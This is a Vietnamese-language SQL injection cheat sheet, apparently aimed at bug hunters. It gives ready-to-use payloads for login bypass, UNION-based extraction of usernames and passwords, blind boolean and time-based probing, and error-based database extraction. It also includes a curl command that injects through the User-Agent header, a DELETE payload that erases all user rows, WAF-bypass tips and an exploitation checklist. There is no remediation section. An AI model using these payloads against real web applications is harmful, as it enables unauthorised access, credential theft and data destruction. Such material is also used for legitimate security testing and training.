# 📘 Tổng quan về SQL Injection (SQLi)

SQL Injection (SQLi) là một trong những lỗ hổng OWASP Top 10 phổ biến và nguy hiểm nhất. Khi ứng dụng web không xử lý dữ liệu đầu vào từ người dùng đúng cách, kẻ tấn công có thể chèn mã SQL vào truy vấn để:

- Trích xuất dữ liệu (Data Extraction)
- Vượt qua xác thực (Authentication Bypass)
- Thực hiện thao tác ghi (INSERT/UPDATE/DELETE)
- Chiếm quyền hệ thống
- Đọc/ghi file, thực thi OS Command (nếu DB hỗ trợ)

---

## ⚒️ Kỹ thuật khai thác SQLi

### 1. Injection vào SELECT/WHERE

#### 🧠 Mục tiêu:
- Bypass đăng nhập
- Đọc dữ liệu từ DB
- Xác định logic câu lệnh SQL

#### 🧪 Kỹ thuật:
- Comment để cắt phần sau:
  ```sql
  ' OR 1=1-- -
  ' OR 'a'='a' # 
  ' OR 1=1/*
  ```
- Sử dụng toán tử logic:
  ```sql
  ' OR username LIKE '%admin%' AND '1'='1
  ```
- Tránh `TRIM()` phá comment:
  ```sql
  ' OR 1=1-- -
  ```

> 💡 Mẹo: dùng `-- -` để giữ khoảng trắng cần thiết khi bị `TRIM()` xử lý.

- Payload nâng cao:
  ```sql
  ' UNION SELECT null, username, password FROM users-- -
  ```

---

### 2. Injection trong INSERT

#### 🧠 Mục tiêu:
- Thêm dữ liệu bất thường
- Ghi dữ liệu độc hại vào log
- Ghi shell vào hệ thống nếu có lỗ RCE

#### 🧪 Kỹ thuật:
- Tấn công qua header: `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`
- Gửi SQLi qua log-access:
  ```bash
  curl -H "User-Agent: ',(SELECT @@version),'" http://target.site
  ```

> 🔥 Nếu server ghi log này vào DB → BOOM, SQLi!

---

### 3. Injection trong UPDATE / DELETE

#### 🧠 Mục tiêu:
- Sửa dữ liệu người khác
- Xóa dữ liệu quan trọng

#### 🧪 Ví dụ:
```sql
username=admin', isAdmin='1
```

```sql
DELETE FROM users WHERE username = 'admin' OR 1=1-- -
```

---

## 🔍 Kỹ thuật nâng cao

### ✅ Boolean-based (Blind)
```sql
' AND 1=1 -- true
' AND 1=2 -- false
```

### 🕗 Time-based (Blind)
```sql
' OR IF(1=1, SLEEP(5), 0)-- -
```

### 🔀 UNION-based
```sql
' UNION SELECT null, version(), user()-- -
```

### 📤 Error-based
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

---

## 🧱 Bypass kỹ thuật

- Sử dụng `ENCODING` → `%27` thay `'`
- Sử dụng `CASE WHEN`, `IF`, `LIKE`, `REGEXP`
- Sử dụng biến, thủ thuật `ORDER BY`, `GROUP BY`, `HAVING`

---

## 🔧 Công cụ hỗ trợ

- `sqlmap` → full auto
- Burp Suite + Plugin như **HackBar**, **Autorize**
- Manual + Repeater → tùy chỉnh payload tay
- Tamper scripts trong sqlmap để bypass WAF

---

## 🧠 Mẹo khi đi săn SQLi

| Tình huống | Chiến thuật |
|-----------|-------------|
| Không thấy lỗi | Dò Blind SQLi bằng delay |
| Có lỗi báo | Dò Error-based |
| Có nhiều cột | Dùng `ORDER BY` để xác định số cột |
| Web encode URL | Dùng payload encode (`%27`, `%23`, v.v) |

---

## 📌 Checklist khai thác

- [x] Test `' or 1=1--`
- [x] Test UNION injection
- [x] Test Boolean và Time-based Blind
- [x] Test các tham số trong Header
- [x] Test tất cả HTTP Method (GET, POST, PUT, PATCH)
- [x] Dò lỗi trong `UPDATE`, `DELETE`, `INSERT`
- [x] Test encode & WAF bypass
- [x] Nếu có file upload, test thêm LFI + SQLi combo
